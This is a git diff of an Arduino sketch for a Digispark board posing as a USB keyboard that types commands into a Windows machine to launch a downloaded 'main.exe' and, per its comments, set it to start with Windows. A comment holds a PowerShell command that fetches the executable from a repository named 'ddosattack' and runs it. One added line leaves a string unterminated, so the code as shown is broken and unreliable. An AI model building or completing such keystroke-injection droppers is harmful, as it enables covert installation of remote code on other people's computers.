@@ -14,9 +14,10 @@ void setup() {
   DigiKeyboard.print("main.exe<");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //line x-x sets the exe file to launch with windows.
-
+  DigiKeyboard.print("
 
   //line x-x launches the exe file and closes the powershell window
+  DigiKeyboard.print(".");
   DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT);
   DigiKeyboard.print("main.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -29,6 +30,9 @@ void setup() {
 void loop() {
 
 }
+
+//https://www.medo64.com/2021/09/add-application-to-auto-start-from-powershell/
 //$PWD.path
 
-// Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe; .\main.exe
+// Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe; 
+//.\main.exe
